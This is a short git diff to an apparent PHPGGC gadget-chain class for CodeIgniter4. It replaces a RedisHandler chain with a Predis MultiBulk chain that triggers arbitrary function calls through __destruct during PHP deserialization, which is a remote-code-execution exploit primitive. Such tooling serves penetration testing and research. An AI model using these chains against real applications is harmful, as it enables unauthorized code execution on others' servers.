@@ -2,17 +2,17 @@
 
 namespace GadgetChain\CodeIgniter4;
 
-class RCE1 extends \PHPGGC\GadgetChain\RCE\FunctionCall
+class RCE6 extends \PHPGGC\GadgetChain\RCE\FunctionCall
 {
-    public static $version = '4.0.2';
+    public static $version = '-4.1.3 <= 4.2.10+';
     public static $vector = '__destruct';
-    public static $author = 'eboda';
+    public static $author = 'CyanM0un';
 
     public function generate(array $parameters)
     {
         $function = $parameters['function'];
         $parameter = $parameters['parameter'];
 
-        return new \CodeIgniter\Cache\Handlers\RedisHandler($function, $parameter);
+        return new \Predis\Response\Iterator\MultiBulk($function, $parameter);
     }
 }
